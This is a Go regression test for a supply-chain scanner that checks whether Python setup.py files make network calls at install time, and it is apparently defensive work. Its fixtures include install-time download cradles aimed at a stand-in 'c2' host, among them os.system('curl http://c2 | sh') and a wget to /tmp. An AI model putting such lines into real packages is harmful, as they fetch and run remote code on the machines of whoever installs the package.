package installsurface

import "testing"

func setupHasNet(src string) bool {
	for _, h := range analyzeSetupPy(src) {
		for _, c := range h.Caps {
			if c == CapNetwork || c == CapCradle {
				return true
			}
		}
	}
	return false
}

// Regression for the beats live-fire: "setup.py reaches the network" fired on
// backoff / deprecated / pyasn1, where the network markers were URLs and words
// inside INERT documentation (a README in long_description, a README as the
// module docstring via long_description=__doc__, a `wget ...` line in a printed
// error message) — never an install-time egress. The determination must strip
// inert text and require a real network call or a runnable shell tool, WITHOUT
// missing a genuine payload.
func TestSetupPyInertNetwork(t *testing.T) {
	// Inert documentation — must NOT be read as egress.
	inert := map[string]string{
		"README in long_description literal (poetry dict, escaped quotes)": "from setuptools import setup\n" +
			"setup_kwargs = {'name': 'x', 'long_description': 'use requests.get(url); it\\'s great; see aiohttp'}\n" +
			"setup(**setup_kwargs)\n",
		"README as module docstring via __doc__ (u-prefixed)": "u\"\"\"\nMyLib\n=====\ninstall: $ pip install MyLib\nexample: ``requests.get(url)``\n\"\"\"\n" +
			"from setuptools import setup\nsetup(name='x', long_description=__doc__)\n",
		"wget in a printed instruction, no exec sink": "import sys\n" +
			"def helptext():\n    print(\"\"\"need setuptools: wget https://bootstrap.pypa.io/ez_setup.py then python ez_setup.py\"\"\")\n" +
			"from setuptools import setup\nsetup(name='x')\n",
		"payload word in a # comment": "# to bootstrap: curl https://x | sh\nfrom setuptools import setup\nsetup(name='x')\n",
	}
	for name, src := range inert {
		if setupHasNet(src) {
			t.Errorf("inert documentation must NOT be read as network egress: %s", name)
		}
	}

	// Genuine egress — must STILL be detected (no blind spot).
	real := map[string]string{
		"module-level urlopen":           "from urllib.request import urlopen\nurlopen('http://c2/x')\nfrom setuptools import setup\nsetup(name='x')\n",
		"requests.get call":              "import requests\nrequests.get('http://c2')\nfrom setuptools import setup\nsetup(name='x')\n",
		"os.system curl|sh cradle":       "import os\nos.system('curl http://c2 | sh')\nfrom setuptools import setup\nsetup(name='x')\n",
		"os.system wget (runnable tool)": "import os\nos.system('wget http://c2/x -O /tmp/p')\nfrom setuptools import setup\nsetup(name='x')\n",
		"subprocess.run shell curl":      "import subprocess\nsubprocess.run('curl http://c2', shell=True)\nfrom setuptools import setup\nsetup(name='x')\n",
	}
	for name, src := range real {
		if !setupHasNet(src) {
			t.Errorf("genuine egress must be detected (no blind spot): %s", name)
		}
	}
}
